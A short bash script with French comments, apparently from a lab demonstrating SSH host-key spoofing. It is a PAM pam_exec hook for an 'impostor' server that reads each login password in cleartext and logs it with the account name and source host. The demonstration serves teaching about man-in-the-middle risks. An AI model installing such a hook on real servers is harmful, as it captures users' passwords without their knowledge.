#!/bin/bash
# Script appelé par PAM (pam_exec expose_authtok) sur le serveur IMPOSTEUR.
# Il démontre qu'un faux serveur reçoit le mot de passe EN CLAIR (après
# déchiffrement SSH) si l'utilisateur ignore l'alerte de clé d'hôte.
read -r MDP
echo "[IMPOSTEUR] Mot de passe intercepté pour le compte ${PAM_USER} depuis ${PAM_RHOST} : ${MDP}" >> /proc/1/fd/1
exit 0
